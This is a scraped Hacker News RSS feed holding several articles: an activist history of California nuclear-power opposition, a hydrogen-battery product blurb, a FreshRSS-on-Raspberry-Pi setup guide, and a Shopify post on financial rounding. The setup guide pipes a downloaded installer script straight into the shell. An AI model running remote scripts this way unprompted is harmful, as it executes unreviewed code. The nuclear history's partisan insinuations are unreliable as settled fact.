February 17, 2021 | https://www.energy-net.org/01NUKE/CALIF.HTM | <a href="https://web.archive.org/web/*/https://www.energy-net.org/01NUKE/CALIF.HTM">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div width="49%"> 
	  <p><span face="Verdana, Arial, Helvetica, sans-serif" size="2" color="#CC6600"><b><span size="3" color="#000000">40 
		Year History of Opposition to Nuclear Power in California </span></b></span> 
		<br>
	  </p>
	  <p><span face="Verdana, Arial, Helvetica, sans-serif" size="2">California 
		citizens have made a unique stand concerning the attempts by Nuclear proponents 
		to make the state a premiere model for commercial nuclear energy. California's major 
		utilities, in particular Pacific Gas and Electric (PG&amp;E) has spent an
		enormous amount of money and political muscle in attempts to build reactors 
		across California but have mostly failed. PG&amp;E was supposedly involved in 
		the Atoms for Peace proposal made in 1953 and was 
		part of a coalition of american utilities that investigated the technical 
		potentials for building nuclear reactors as a source of electricity.</span></p>
	  <p><span face="Verdana, Arial, Helvetica, sans-serif" size="2">The following 
		is a brief summary of the battles against nuclear power that started here 
		in California in 1958.</span></p>
	  <p><span face="Verdana, Arial, Helvetica, sans-serif" size="2">Northern 
		California is the home of the first successful opposition to the promotion 
		and development of commercial nuclear reactors in the U.S. In the 1950's 
		northern and central California's privately Owned utility company, PG&amp;E 
		was planning to be one of the giants in the new field of nuclear energy. 
		It had helped design and build the Dresden I reactor in Illinois with 
		a consortium of 5 major companies, including General Electric(GE).</span></p>
	  <p><span face="Verdana, Arial, Helvetica, sans-serif" size="2">In conjunction 
		with GE, it built the vallecitos nuclear complex south of San Francisco 
		and then went it alone with their Humboldt reactor near Arcata. But their 
		luck took a turn for the worse when they tried to build the world's largest 
		nuclear facility 1000 feet from the fault that caused the 1906 earthquake.</span></p>
	  <p><span face="Verdana, Arial, Helvetica, sans-serif" size="2">Yes, PG&amp;E 
		even said they could build a reactor in downtown San Francisco! In 
		fact they were planning the construction of 63 reactors in California 
		during the early 1960's, one every 25 miles along the coast They even 
		 planned to build a floating reactor!!</span></p>
	  <h2><span face="Verdana, Arial, Helvetica, sans-serif" size="2"><b>The 
		Bodega Bay Duck Pond</b><br>
		</span></h2>
	  <p><span face="Verdana, Arial, Helvetica, sans-serif" size="2">When PG&amp;E 
		started pushing plans to build the reactors at Bodega Pay in 1958 a literal 
		groundswell of opposition erupted during the next 6 years to stop them 
		dead cold. The site they had chosen near the San Andreas Fault Zone was 
		just a few miles from the epicenter of the Great San Francisco Quake where 
		ground shifts of over 20 feet had occurred in 1906.</span></p>
	  <p><span face="Verdana, Arial, Helvetica, sans-serif" size="2">PG&amp;E's 
		unethical plans to build the reactor is not new for this company, as they 
		have a history of unfair tactics that goes back to the company's birth. 
		Upon deciding that the Bodega Headlands would be an excellent site for the largest nuclear 
		facility in the world, PG&amp;E simply beat the state out in its plans 
		to make the area a state park. </span></p>
	  <p><span face="Verdana, Arial, Helvetica, sans-serif" size="2">The battle 
		started in 1958 when the Santa Rosa Press Democrat published the first 
		story on PG&amp;E's plans. The company's ignored their own geologist, who had warned 
		that the area was likely to be effected by strong shaking during a quake. 
		Concerned citizens started getting involved as PG&amp;E refused to acknowledge 
		publicly that they were actually going to build nuclear reactors at the 
		proposed site.</span></p>
	  <p><span face="Verdana, Arial, Helvetica, sans-serif" size="2">The 1957 
		windscale accident in England, where a small reactor had burned out of 
		control for more than a day, helped focus concerns about safety on this 
		new idea of nuclear power.</span></p>
	  <p><span face="Verdana, Arial, Helvetica, sans-serif" size="2">In 1961, 
		after nearly 3 years of pushing their plan behind the scenes, PG&amp;E 
		announced plans to build the Atomic Park at the Bodega site. The ensuing battle 
		and PG&amp;E's nasty style started to backfire though as public concerns 
		grew.</span></p>
	  <p><span face="Verdana, Arial, Helvetica, sans-serif" size="2">Major opposition 
		came from within the ranks of the Sierra Club, but the board refused to 
		allow its active members the right to oppose the reactors on the issue 
		of earthquakes. When it came out that PG&amp;E had doctored fault maps 
		of the site, all hell broke loose.</span></p>
	  <p><span face="Verdana, Arial, Helvetica, sans-serif" size="2">One of PG&amp;E's 
		major claims at the time was that they could build reactors that would 
		survive a great Earthguake. At one point they said that the reactors could 
		survive a quake 50 per cent bigger than the O6' quake by floating the 
		reactors on 3 feet of compressable material but when the public and the 
		Atomic Energy Commission (AEC) got a close-up view of the devastation 
		from the air of the quake in Alaska during the spring of 1964, support 
		for the reactor complex dried up.</span></p>
	  <p><span face="Verdana, Arial, Helvetica, sans-serif" size="2">Opponents 
		had "infiltrated" the federal government and were pushing 
		for closure. With the disclosure of the AEC's WASH 740 report, which documented 
		potential dangers to the bay area residents in case of an accident, opposition 
		finally reached all government levels.</span></p>
	  <p><span face="Verdana, Arial, Helvetica, sans-serif" size="2">California 
		governor Pat Brown asked that PG&amp;E abandon the reactors. Two days 
		later PG&amp;E caved in and called the project off. The battle ended in 
		1964 with a $7 million duck pond as a living monunent to the future. (It 
		is still there today)</span></p>
	  <p><span face="Verdana, Arial, Helvetica, sans-serif" size="2">This experience 
		gave PG&amp;E a deadly lesson on how to overcome public concerns at their 
		next reactor site--Diablo Canyon.</span></p>
	  <h2><span face="Verdana, Arial, Helvetica, sans-serif" size="2"><b>The 
		Diablo Canyon Nightmare:</b><br>
		</span></h2>
	  <p><span face="Verdana, Arial, Helvetica, sans-serif" size="2">The 25 year 
		battle over Diablo Canyon is a classic case of courage in the face of 
		the political power this utility unleashed in its drive to build a major 
		nuclear facility in California.</span></p>
	  <p><span face="Verdana, Arial, Helvetica, sans-serif" size="2">PG&amp;E's 
		plans to build a mega facility shifted south to the less populated coastal 
		area near San Luis Obispo. The company purchased the Nipomo Dunes and 
		told environmental leaders that unless an acceptable site was chosen that 
		they would go ahead and build a facility at the popular beach area. The 
		wife of the Sierra Club president was selected to come up with an acceptable 
		site in secrecy with the company. </span></p>
	  <p><span face="Verdana, Arial, Helvetica, sans-serif" size="2">The site 
		chosen, Diablo Canyon, was California's second to last coastal wilderness 
		area, an area that had been proposed as a National Park due to its beauty. 
		Besides being a sacred Chumash burial ground, it was the home of one of 
		a kind 1,000 year old Oak trees (the largest in the world). It was also 
		the home of one of the state's largest populations of abalone and sea 
		otters.</span></p>
	  <p><span face="Verdana, Arial, Helvetica, sans-serif" size="2">In the process 
		of getting permission to go ahead with Diablo, PG&amp;E suceeded in selling 
		the site to key members of the Sierra Club's board of directors. The Utility 
		had sympathetic board members flown over the Diablo site in Frank Sinatra's 
		Lear jet, with entertainment by Danny Kaye (Danny later came out against 
		the reactors).</span></p>
	  <p><span face="Verdana, Arial, Helvetica, sans-serif" size="2">The first 
		slam-dunk by PG&amp;E came against the local farmer who had the right 
		of way access rights over the Diablo property. The company went to court 
		and had his rights removed. The beligerant act made the man a life-long 
		opponent of PG&amp;E's plan.</span></p>
	  <h2><span face="Verdana, Arial, Helvetica, sans-serif" size="2"><b>PG&amp;E 
		gets Cozy with Sierra Club Board Members</b><br>
		</span></h2>
	  <p><span face="Verdana, Arial, Helvetica, sans-serif" size="2">The biggest 
		tactical plan was to focus on the Sierra Club. The company and the electric 
		industry already had the board's ear with their claims that nuclear power 
		could reduce air pollution that was caused by coal power plants. The utility, 
		with inside help then sought official support for Diablo Canyon when club's 
		only board member who knew about the site's natural value was in Europe. 
		The board went along with PG&amp;E, and in fact voted to block any Club 
		members or chapters opposition to the facility. This move enraged David 
		Brower, eventually resulting in the split up of the club and the creation 
		of Friends of the Earth by embittered Sierra Club members who were angered 
		by the actions of key Sierra Club Board members.</span></p>
	  <p><span face="Verdana, Arial, Helvetica, sans-serif" size="2">PG&amp;E's 
		success within the Sierra Club was the culmination of 2 years of behind 
		the scenes work by Doris Leonard. She was the wife of the president of 
		the club. Her role in exchanging the Nipomo Dunes site for Diablo Canyon 
		was rewarded later when she was elected to PG&amp;E's board of directors. 
		</span></p>
	  <p><span face="Verdana, Arial, Helvetica, sans-serif" size="2">The Sierra 
		Club refused to allow its local chapter near Diablo to use the club nane 
		in opposing the five proposed reactors at the site. The group was forced 
		to take on another name in 1966, the Shoreline Preservation Conference.</span></p>
	  <p><span face="Verdana, Arial, Helvetica, sans-serif" size="2">The group 
		was concerned about earthquake faults along the coast as locals were fully 
		aware of the 1927 quake that completely destroyed a nearby city. They 
		called for a full investigation into potential fault areas. Their efforts 
		were ignored by the government and the media.</span></p>
	  <p><span face="Verdana, Arial, Helvetica, sans-serif" size="2">News of the 
		reactor siting was poorly covered by the Bay area's conservative media, 
		a tactic that made the issue invisible to bay area residents who had stopped 
		PG&amp;E's Bodega reactor plans.</span></p>
	  <p><span face="Verdana, Arial, Helvetica, sans-serif" size="2">Oil companies 
		chart the Hosgri Fault The Hosgri fault had been mapped by Shell oil geologists 
		during the 1960's, but not published until 1970. PG&amp;E claims to have 
		not found out about the fault until late 1972. The information was finally 
		publicized in November 1973 by an investigative reporter in Los Angeles. 
		In a suspicious turn of events, the lawyer who had been fighting the case 
		since 1965 was found dead in his car just after the announcement. Authorities 
		claimed it was suicide, with no other investigation to follow up.</span></p>
	  <p><span face="Verdana, Arial, Helvetica, sans-serif" size="2">P&amp;GE's 
		bad memories of Bodega Bay helped fuel their push to ignore earthquake 
		concerns at Diabl Canyon. The same Seismic experts who had been involved 
		with the Bodega Bay facility were brought in to review the site for seismicity. 
		They pointed out major flaws in PG&amp;E's own $2,000 seismic study. A 
		state of the art study at the time would have cost $100,000)</span></p>
	  <h2><span face="Verdana, Arial, Helvetica, sans-serif" size="2"><b>The 
		Hosgri Fault Forces PG&amp;E to Rebuild Diablo Again</b><br>
		</span></h2>
	  <p><span face="Verdana, Arial, Helvetica, sans-serif" size="2">A storm of 
		controversy erupted around the facility as one of the units was reaching 
		completion. Even with the help of the Nuclear Regulatory Commission's 
		(NRC) predecessor, the AEC, PG&amp;E was finally forced after 3 years 
		of federal in-fighting to rebuild seismic bracing in 1976.</span></p>
	  <p><span face="Verdana, Arial, Helvetica, sans-serif" size="2">In attempts 
		to stop a seismic retrofit, PG&amp;E even coined the Tao Effect which 
		said that the bigger the structure, the less damage a quake would have.</span></p>
	  <p><span face="Verdana, Arial, Helvetica, sans-serif" size="2">Seismic experts 
		for the concerned activists remained uninpressed, ‚Ä¶</span></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.energy-net.org/01NUKE/CALIF.HTM">https://www.energy-net.org/01NUKE/CALIF.HTM</a></em></p>]]>
            </description>
            <link>https://www.energy-net.org/01NUKE/CALIF.HTM</link>
            <guid isPermaLink="false">hacker-news-small-sites-26175253</guid>
            <pubDate>Thu, 18 Feb 2021 03:28:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[LAVO Hydrogen Battery for Home]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26175221">thread link</a>) | @throwaway888abc
<br/>
February 17, 2021 | https://lavo.com.au/lavo-hydrogen-battery/ | <a href="https://web.archive.org/web/*/https://lavo.com.au/lavo-hydrogen-battery/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        
        <p><label for="active-state--process">Inside the box</label>
            <label for="active-state--connectivity">How it works</label>
        </p>
        <p><span><p>LAVO<sup>‚Ñ¢</sup> acts as a solar sponge, integrating with rooftop solar to capture and store renewable energy for use when you need it.</p>
<ul>
<li><strong>Creates Hydrogen</strong> from water</li>
<li><strong>Stores Hydrogen</strong> into LAVO‚Ñ¢‚Äôs patented metal hydride</li>
<li><strong>Generates Electricity</strong> by converting hydrogen into power</li>
<li><strong>Delivers Power</strong> at a regulated voltage to your home</li>
<li><strong>Monitors &amp; Controls</strong> performance via the LAVO‚Ñ¢ app</li>
</ul>
</span></p><a href="https://lavo.com.au/#specs">
            Tech Specs            <svg width="59" height="10" viewBox="0 0 59 10" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M54 8.5L58 4.75M58 4.75L54 1M58 4.75H1" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
            </svg>
        </a>
        <a href="https://lavo.com.au/pricing">
            Pricing
            <svg width="59" height="10" viewBox="0 0 59 10" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M54 8.5L58 4.75M58 4.75L54 1M58 4.75H1" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
            </svg>
        </a>
    </div></div>]]>
            </description>
            <link>https://lavo.com.au/lavo-hydrogen-battery/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26175221</guid>
            <pubDate>Thu, 18 Feb 2021 03:23:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Turn Hacker News into an RSS Feed]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26175012">thread link</a>) | @MattyRad
<br/>
February 17, 2021 | https://soapstone.mradford.com/hn-rss-guide/ | <a href="https://web.archive.org/web/*/https://soapstone.mradford.com/hn-rss-guide/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <br>
      <section>
        
  <article>
    <header>
      

      <time>
        
        February 03, 2021
      </time>

      
    </header>

    <h2 id="hn-hijacks-your-brain">HN hijacks your brain</h2>
<p>You're an engineer who looks at Hacker News 2-5 times a day. HN is a good way to <em>fill the gaps</em> in time. You scan the front page- repeatedly- for links of interest... reading titles, eyeing scores... often jumping directly to the (overtly contrarian) comments to see if a link is even worth the energy.</p>
<p>Sound familiar?</p>
<p>That cycle hits a sickening <strong>5</strong>/10 of Tristan Harris's <a href="https://medium.com/thrive-global/how-technology-hijacks-peoples-minds-from-a-magician-and-google-s-design-ethicist-56d62ef5edf3">list of mind hijacks</a>:</p>
<ul>
<li>(1)  Control the Menu, Control the Choices</li>
<li>(3)  Fear of missing something important</li>
<li>(4)  Social Approval (upvotes)</li>
<li>(6)  Bottomless bowl</li>
<li>(10) Forecasting</li>
</ul>
<blockquote>
<p>These hijacks  <a href="https://en.wikipedia.org/wiki/Hanlon%27s_razor">aren't</a> intentional, they're just a byproduct of link aggregation platforms.</p>
</blockquote>
<p>Stoics are turning in their graves, where instead of knowing what's important, the links on HN <em>become</em> what's important, no matter how trivial, pedantic, hyped, or irrelevant.</p>
<p>So if you want help breaking this negative feedback loop, I encourage you to reclaim your attention by turning HN into and RSS feed;</p>
<p>Get more <a href="https://medium.com/@bre/the-cult-of-done-manifesto-724ca1c2ff13">done</a>. Ignore the comments and the <a href="https://www.ribbonfarm.com/2020/01/16/the-internet-of-beefs/">mooks</a>. Set limits. It's incredibly liberating to finish your RSS feed and think to yourself, <em>now what</em>?</p>

<p>Declaring what deserves your attention is the defining feature of RSS, so it's important to declare what aspect of HN you like. Generally people look at high scores. Fortunately HN already has a url specifically for its most "important" (i.e. upvoted) links: <a href="https://news.ycombinator.com/best"><code>/best</code></a>.</p>
<p>So if we can subscribe to the links from that page, we'll get the bulk of the links that deserve our attention.</p>
<p>For me, it's critically important for RSS to be a self-hosted solution. No third parties <small>(I'm looking at <em>you</em>, Feedly)</small>.</p>
<p>Otherwise, what's the point of retaking control, you're just shunting control to yet another third party.</p>
<p>My personal setup goes like this:</p>
<ul>
<li>Get the Raspberry Pi you bought but never used</li>
<li>Install Docker</li>
<li>Run FreshRSS</li>
<li>Add HN <a href="https://news.ycombinator.com/best"><code>/best</code></a> as an RSS feed</li>
<li>(Optional) Port forwarding and DNS setup</li>
<li>(Optional) Pick out a smartphone app to sync with</li>
</ul>
<p>This is just the first thing that worked for me, so by no means is it the guaranteed best. Recommendations and alternatives are welcome! You can, of course, tailor the following guide if you'd like to use a VPS.</p>

<h3 id="prepare-the-pi">Prepare the Pi</h3>
<h4 id="install-git">Install git</h4>
<p>Do a standard Raspbian setup the with <a href="https://soapstone.mradford.com/raspberry-pi-automatic-wifi-and-ssh">internet/ssh/hostname</a>. Then install git:</p>
<pre><span>sudo</span><span> apt-get install git
</span></pre><h4 id="install-docker">Install Docker</h4>
<pre><span>curl -sSL</span><span> https://get.docker.com | </span><span>sh
</span></pre><pre><span>sudo</span><span> usermod</span><span> -aG</span><span> docker pi &amp;&amp; </span><span>sudo</span><span> reboot
</span></pre><h4 id="install-docker-compose">Install Docker-compose</h4>
<blockquote>
<p>This method is specifically for Raspbian, if you're using a VPS or non-ARM machine, install docker-compose the <a href="https://docs.docker.com/compose/install/">conventional</a> way.</p>
</blockquote>
<pre><span>sudo</span><span> apt-get install</span><span> -y</span><span> libffi-dev libssl-dev
</span><span>sudo</span><span> apt-get install</span><span> -y</span><span> python3 python3-pip
</span><span>sudo</span><span> apt-get remove python-configparser
</span><span>sudo</span><span> pip3 install docker-compose
</span></pre>
<pre><span>git</span><span> clone https://github.com/FreshRSS/FreshRSS

cd FreshRSS/Docker
</span></pre>
<p>We're using a Raspberry Pi, so you'll need to pick out the ARM image! Use your favorite editor to modify these lines of the <code>docker-compose.yml</code> file:</p>
<pre><span># docker-compose.yml
</span><span>-    image: freshrss/freshrss:latest
</span><span>+    image: freshrss/freshrss:arm
</span></pre>
<p>Now you're ready to execute FreshRSS:</p>
<pre><span>docker-compose</span><span> up</span><span> -d
</span></pre>
<p>Once that's complete, head to your Pi's IP address (or hostname, if you opted for that) on port <code>8080</code> in your laptop's/desktop's browser (something like http://1.2.3.4:8080), and go through the initial setup.</p>

<p>Add <code>https://hnrss.org/best</code> as an RSS feed (from <a href="https://hnrss.github.io/">hnrss.github.io</a>).</p>
<p>Congratulations! You've officially RSS-ified HN!</p>
<h3 id="optional-port-forwarding-and-dns-setup">(Optional) Port forwarding and DNS setup</h3>
<p>Unless you went with the VPS route, you're probably behind a LAN, so if you want to access your RSS outside your LAN, you'll need to set up port forwarding and/or DNS. That's beyond the scope of this guide, but there are many guides online that can get you there.</p>
<h3 id="optional-pick-out-an-app">(Optional) Pick out an app</h3>
<p>You could just expose the pi to the internet, and read RSS directly from the browser, but I think having an app is a nice touch.</p>
<p>First you'll need to enable API access in FreshRSS. Go to <code>Authentication</code> and check the box to allow API access:</p>
<p><img src="https://soapstone.mradford.com/freshrss-auth.png" alt="fresh-rss-screenshot1"></p>
<p>Then create an API key under <code>Profile</code>:</p>
<p><img src="https://soapstone.mradford.com/freshrss-profile.png" alt="fresh-rss-screenshot2"></p>
<p>Now you can use the API url and the API key in your selected app to pull data down locally. Nice!</p>
<p>Here's a non-exhaustive list of open-source (Android) apps to get you started.</p>
<ul>
<li><a href="https://github.com/readrops/Readrops">Readrops</a> - <a href="https://play.google.com/store/apps/details?id=com.readrops.app">play store</a></li>
<li><a href="https://github.com/nextcloud/news-android">New Android</a> - <a href="https://play.google.com/store/apps/details?id=de.luhmer.owncloudnewsreader&amp;pcampaignid=MKT-Other-global-all-co-prtnr-py-PartBadge-Mar2515-1">play store</a></li>
<li><a href="https://github.com/nilsbraden/ttrss-reader-fork">ttrss-reader-fork</a> - <a href="https://play.google.com/store/apps/details?id=org.ttrssreader">play store</a></li>
<li><a href="https://github.com/fistons/TinyTinyFeed">TinyTinyFeed</a> - <a href="https://play.google.com/store/apps/details?id=org.poopeeland.tinytinyfeed">play store</a></li>
</ul>
<blockquote>
<p>Truth be told, a lot of the closed source RSS apps I've checked out tend to be slightly higher in quality, so if you're willing to compromise on that front then they are worth exploring.</p>
</blockquote>
<h2 id="what-did-we-gain">What did we gain?</h2>
<p>It may not seem like it, but we've gained a <strong>lot</strong> by doing this!</p>
<ul>
<li><strong>Defeated the mind hijacks</strong>:
<ul>
<li><strike>(1)</strike> Gained leverage over the "menu"</li>
<li><strike>(3)</strike> Declared which things are important up front, and view them only <em>once</em></li>
<li><strike>(4)</strike> Ignore comments. Scores only matter in that they are relatively high</li>
<li><strike>(6)</strike> Created a bottom (of the bowl) by grabbing a limited number of links</li>
<li><strike>(10)</strike> Easily defer time intensive links for later</li>
</ul>
</li>
<li><strong>Time</strong>
<ul>
<li>Prevent re-reads of HN</li>
<li>Make it easier to pick out the most interesting links and discard irrelevant ones</li>
<li>If you <em>really</em> want to read comments, you'll need to go out of your way</li>
<li>Star or bookmark links to read more in-depth at a later time</li>
</ul>
</li>
<li><strong>Data sovereignty</strong>
<ul>
<li>We control our own data; no relying on third parties (e.g. Feedly)</li>
</ul>
</li>
<li><strong>Cloud Resilience</strong>
<ul>
<li>Lose a phone? Upgrade computers? Need to sync between phone and desktop? No problem!</li>
</ul>
</li>
<li><strong>The ability to add other RSS feeds</strong>
<ul>
<li>We've opened up the ability to use RSS in other feeds
<ul>
<li>For reddit, just <a href="https://www.howtogeek.com/320264/how-to-get-an-rss-feed-for-any-subreddit/">append</a> <code>.rss</code> to any url</li>
<li>For youtube, plug in the URL to any channel!</li>
</ul>
</li>
</ul>
</li>
<li><strong>Costs nothing</strong>
<ul>
<li>Put an otherwise dusty Raspberry Pi to good use</li>
</ul>
</li>
<li><strong>RSS adoption</strong>
<ul>
<li><em>If you really want an RSS resurgence, <strong>start using it</strong></em></li>
</ul>
</li>
</ul>


    
      
    
  </article>

      </section>
    </div></div>]]>
            </description>
            <link>https://soapstone.mradford.com/hn-rss-guide/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26175012</guid>
            <pubDate>Thu, 18 Feb 2021 03:02:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Eight Tips for Dealing with Hanging Pennies]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26174428">thread link</a>) | @oedmarap
<br/>
February 17, 2021 | https://shopify.engineering/eight-tips-for-hanging-pennies | <a href="https://web.archive.org/web/*/https://shopify.engineering/eight-tips-for-hanging-pennies">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
  <p>Rounding is used to simplify the use of numbers that contain more decimal places than required. The perfect example is representing cash, money, dough. In the USA and Canada, the cent represents the smallest fraction of money. The US and Canadian dollar can‚Äôt be transacted with more than 2 decimal places. When numbers represent money, we use rounding to replace an un-representable, un-transactable money amount with one that represents a cash tender.</p>
<p>The best way to introduce this blog is by asking you to watch a scene from one of my favorite movies, <em>Office Space</em>:</p>
<p><iframe width="560" height="315" src="https://www.youtube.com/embed/yZjCQ3T5yXo" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p>
<p>In this scene, Peter describes to his girlfriend a program that compounds interest using high precision amounts. He explains that they simplify the calculations by rounding the amounts down and by doing that they‚Äôre left with hanging pennies that they transfer into their personal accounts.</p>
<p>This is exactly what we want to avoid‚Äîwe want to avoid having one developer aware of hanging pennies. We also want to avoid having many hanging pennies. And when faced with such a situation, we want to identify such calculations and put a plan in place on who to notify and what to do with them.&nbsp;</p>
<p>Before I explain this further, I want to tell you this story first. My father introduced banking software systems in the Middle East in the late 70‚Äôs. Rest assured he was bound to round. He faced the same issue Peter faced. He resolved it by accepting that he can‚Äôt resolve it. So, he created an account where the extra pennies accumulated and later were given as bonuses to the IT team at the bank. It was a way of getting back at the rest of the employees at the bank that didn‚Äôt want to move to using a software system and preferred pen and paper.</p>

<p>Okay, let‚Äôs get back to breaking this problem down further with another example.</p>
<p>Let‚Äôs assume we can only charge <strong>1</strong> total amount, even if this 1 amount consists of a summation of multiple rates.</p>
<p>Rate 1 is 2.4%<br>Rate 2 is 2.9%<br> Amount $10.10</p>
<p>When rounding individual rate amounts:<br> Rate 1 total = (rate /100) * $10.10 = 0.2424 = rounded = 0.24<br> Rate 2 total = (rate /100) * $10.10 = 0.2929 = rounded = 0.29<br> Total = 0.24 + 0.29 = <strong>0.53</strong></p>
<div><p>When rounding total of the rate amounts:<br> Rate 1 total = (rate /100) * $10.10 = 0.2424<br> Rate 2 total = (rate /100) * $10.10 = 0.2929</p><p> Total = 0.2424 + 0.2929 = 0.5353 = rounded = <strong>0.54</strong></p></div>
<p>The example above makes it clear that deciding when to round can either make you more money by collecting the loose penny or lose money by deciding to let go of it.</p>
<p>Rounding at different stages in the example above has more impact if there are currency conversions involved. As a rule of thumb, the more currency conversions (which also involve rounding) and more rounding, the more we lose precision along the way.&nbsp;</p>
<p>Rational numbers are natural products of various banking calculations: distributed payments, shared liabilities, and rates applied. So, you‚Äôll face other rounding encounters in many other places in financial software, most notably while calculating taxes or discounts and, just like in <em>Office Space</em>, while calculating interest.&nbsp;</p>
<p>Did it make <strong>cents</strong>? I hope you have a grasp on the problem. Now, is this avoidable? No, it‚Äôs not. If you‚Äôre working on financial software you‚Äôll eventually be bound to round. But, we can control where and how to handle the precision loss. I‚Äôm sharing 8 tips to make your precision obsessive compulsiveness a bit less troubling to you as a developer and to the company as a business.</p>
<h2>1. Notify Stakeholders</h2>
<p>Show and tell where the rounding happens within your calculations to the stakeholders of your project. Explain the impact of the rounding, document it, and keep talking about it until all leaders on your team and within your department are aware. You, as a developer, don‚Äôt have to take the full burden of knowing that the company is making less than 1 cent on some transactions because of the calculations you put in place. Is a problem really a problem if it‚Äôs everyone‚Äôs problem?!</p>
<h2>2. Use Banker‚Äôs Rounding</h2>
<p>There are many types of rounding. There are rounding methods that increase bias and rounding methods that decrease bias. <a href="https://www.sqlservercentral.com/articles/bankers-rounding-what-is-it-good-for" target="_blank" title="Banker‚Äôs Rounding. What is it good for?" rel="nofollow noopener noreferrer">Banker‚Äôs rounding</a> is the method proven to decrease rounding bias within calculations. Banking rounding deliberately distorts some of the rounded values to bring rounding totals of rounded numbers as close to the totals of the original numbers. Talking about why regular rounding taught in schools can‚Äôt meet our needs and why Banker‚Äôs rounding is mostly used for financial calculations would turn this blog into a math lesson, and as much as I would love to do that, I‚Äôd probably lose many readers.</p>
<h2>3. Use Data Types That Hold the Most Precision</h2>
<p>Within your calculations, ensure that <strong><em>all</em></strong> variables used are data types that can hold as much precision as possible (can hold enough decimal points). For example, using a double instead of a float. It‚Äôs important to keep the precision wherever there isn‚Äôt rounding involved as it reduces the amount of hanging pennies.&nbsp;</p>
<h2>4. Be Consistent</h2>
<p>I mean, this applies to a lot of things in life. When you and your team decide on which rounding methods to use, ensure that the same rounding method is used throughout your code.&nbsp;</p>
<h2>5. Be Explicit About Rounding</h2>
<p>When rounding within your calculation make it explicit by either adding comments or prefix rounded variables with ‚Äúrounded_‚Äù. This ensures that anyone reading your code understands where precision loss is happening. Link to documentation about rounding strategies within your code documentation.</p>
<h2>6. Refer to Government Rounding Standards</h2>
<figure><img alt="A photo of the 1040 U.S. Individual Income Tax Return form on a desk." data-src="https://cdn.shopify.com/s/files/1/0779/4361/files/tax-forms.jpg?v=1613500314" src="https://cdn.shopify.com/s/files/1/0779/4361/files/tax-forms.jpg?v=1613500314">
<figcaption>The 1040 U.S. Individual Income Tax Return form</figcaption>
</figure>
<p>Losing precision is a universal problem and not only suffered by mathematicians. Refer to your government‚Äôs ruling around rounding. When it comes to tax calculations, governments might have different rules. Refer to them and educate yourself and your team.</p>
<h2>7. Round Only When You Absolutely Have To</h2>
<p>Remember, only tender money amounts need to be rounded. Whenever you can avoid rounding, do so!</p>
<h2>8. Tell Your Users</h2>
<p>Please don‚Äôt hide what rounding methods you use to your users. Many users will try to reverse engineer calculations on their own, and as a company you don‚Äôt want to end up explaining this several times. Ensure rounding rules are explicitly written in your documentation and easily accessible.&nbsp;</p>
<figure>
<p><img alt="A circular logo with a Shopify shopping bag above the words &quot;Be Merchant Obsessed. What Shopify Values&quot;" data-src="https://cdn.shopify.com/s/files/1/0779/4361/files/Be-Merchant-Obsessed.png?format=jpg&amp;quality=90&amp;v=1613501214" src="https://cdn.shopify.com/s/files/1/0779/4361/files/Be-Merchant-Obsessed.png?format=jpg&amp;quality=90&amp;v=1613501214"></p>
<figcaption>Be Merchant Obsessed</figcaption>
</figure>
<p>At Shopify, we are, of course, bound to round. If you are a Shopify merchant reading this post I want to assure you that in all our calculations, developers are biased towards benefiting our merchants. Not only are our support teams merchant obsessed, all Shopify developers are too.</p>
<p>Dana is a senior developer on the Money team at Shopify. She‚Äôs been in software engineering since 2007. Her primary interests are back-end development, database design, and software quality management. She's contributed to a variety of products, and since joining Shopify she's been on the Shopify Payments and Balance teams. She recently switched to data development to deliver impactful money insights to our merchants.</p>
<hr>
<p>We're planning to DOUBLE our engineering team in 2021 by hiring 2,021 new technical roles (see what we did there?). Our platform handled record-breaking sales over BFCM and commerce isn't slowing down. <a href="https://www.shopify.com/careers/2021?itcat=EngBlog&amp;itterm=Post" target="_blank">Help us scale &amp; make commerce better for everyone</a>.</p>
</div></div>]]>
            </description>
            <link>https://shopify.engineering/eight-tips-for-hanging-pennies</link>
            <guid isPermaLink="false">hacker-news-small-sites-26174428</guid>
            <pubDate>Thu, 18 Feb 2021 01:42:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Demand-Side Thinking: Creating Pull for Your Products]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26174215">thread link</a>) | @luthfur
<br/>
February 17, 2021 | https://makingsmallercircles.com/uncategorized/demand-side-thinking-creating-pull-for-your-products/ | <a href="https://web.archive.org/web/*/https://makingsmallercircles.com/uncategorized/demand-side-thinking-creating-pull-for-your-products/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">

<!-- .entry-header -->


	<div>
		<main id="main">

		
<article id="post-368">
	
	<div>
		
<p>A great product tends to sell itself. It‚Äôs the obvious choice for the problem it solves, and it solve that problem very well. Such a product appears to have a natural pull. So how can you go about creating a product like that?</p>



